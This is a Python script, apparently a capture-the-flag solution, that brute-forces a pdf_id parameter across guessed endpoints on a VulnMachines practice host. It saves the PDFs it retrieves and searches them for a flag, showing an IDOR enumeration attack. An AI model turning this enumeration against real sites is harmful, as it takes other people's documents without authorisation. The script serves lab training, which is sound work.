#!/usr/bin/env python3
import urllib.request
import urllib.parse

print("[*] Searching specifically for pdf_id parameter vulnerability")
print("[*] Based on VulnMachines writeup")

base = "http://hackme1.vulnmachines.com"

# All possible endpoints that might have pdf_id
endpoints = [
    "", "/", 
    "index.php", "main.php", "app.php",
    "download.php", "Download.php", "DOWNLOAD.PHP",
    "file.php", "File.php", "FILE.PHP",
    "pdf.php", "Pdf.php", "PDF.PHP",
    "get.php", "Get.php", "GET.PHP",
    "fetch.php", "view.php", "load.php",
    "idor/download.php", "IDOR/download.php",
    "idor/file.php", "IDOR/file.php",
    "idor/", "IDOR/", "idor/index.php", "IDOR/index.php"
]

# Test pdf_id values from 0 to 100
for endpoint in endpoints:
    for pdf_id in range(0, 101):
        url = f"{base}/{endpoint}?pdf_id={pdf_id}"
        
        try:
            with urllib.request.urlopen(url, timeout=3) as response:
                content = response.read()
                
                # Check if it's a PDF
                if content[:4] == b'%PDF':
                    print(f"\n[!!!] PDF FOUND WITH pdf_id={pdf_id}")
                    print(f"URL: {url}")
                    print(f"Size: {len(content)} bytes")
                    
                    filename = f"/workspace/PDF_ID_{pdf_id}.pdf"
                    with open(filename, 'wb') as f:
                        f.write(content)
                    print(f"Saved to: {filename}")
                    
                    # Check for flag
                    if b'vnm{' in content.lower() or b'flag' in content.lower():
                        print("[!!!] THIS PDF CONTAINS THE FLAG!")
                        # Try to extract the flag
                        flag_start = content.lower().find(b'vnm{')
                        if flag_start != -1:
                            flag_end = content.find(b'}', flag_start)
                            if flag_end != -1:
                                flag = content[flag_start:flag_end+1]
                                print(f"FLAG: {flag.decode('utf-8', errors='ignore')}")
                    
                    # Found a PDF, now try adjacent IDs
                    print("\n[*] Trying adjacent pdf_id values...")
                    for adj_id in [pdf_id-1, pdf_id+1, pdf_id+2]:
                        if adj_id >= 0:
                            adj_url = f"{base}/{endpoint}?pdf_id={adj_id}"
                            try:
                                with urllib.request.urlopen(adj_url, timeout=3) as adj_response:
                                    adj_content = adj_response.read()
                                    if adj_content[:4] == b'%PDF':
                                        print(f"[+] Another PDF at pdf_id={adj_id}")
                                        adj_filename = f"/workspace/PDF_ID_{adj_id}.pdf"
                                        with open(adj_filename, 'wb') as f:
                                            f.write(adj_content)
                            except:
                                pass
                    
                    print("\n[+] IDOR vulnerability confirmed!")
                    print(f"[+] Vulnerable endpoint: {base}/{endpoint}")
                    print(f"[+] Vulnerable parameter: pdf_id")
                    exit(0)
                    
        except Exception:
            pass

print("\n[-] No PDF found with pdf_id parameter")
print("[*] The challenge might use a different parameter name or endpoint")